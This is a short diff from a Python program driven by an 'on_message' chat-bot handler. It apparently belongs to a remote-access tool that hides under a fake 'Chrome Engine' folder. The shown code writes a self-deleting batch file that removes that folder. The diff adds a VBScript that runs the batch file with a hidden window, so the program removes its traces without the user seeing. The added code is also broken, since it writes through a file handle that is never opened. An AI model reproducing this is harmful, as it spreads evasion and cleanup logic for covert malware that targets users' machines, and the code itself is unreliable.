@@ -92,7 +92,12 @@ async def on_message(message):
                         file.write(f'rmdir "%USERPROFILE%\AppData\Local\Google\Chrome\Chrome Engine"\n')
                         file.write('CMD /C DEL %0')
                         file.close()
-                    os.system(os.path.join(os.environ['appdata'], 'uninst.bat'))
+                    with open(os.path.join(os.environ['appdata'], 'goodbye.vbs'), 'w'):
+                        file.write('Set WshShell = CreateObject("WScript.Shell")\n')
+                        file.write('WshShell.Run chr(34) & "uninst.bat" & Chr(34), 0\n')
+                        file.write('Set WshShell = Nothing')
+                        file.close()
+                    os.system(os.path.join(os.environ['appdata'], 'goodbye.vbs'))
 
 
     except Exception as Error:
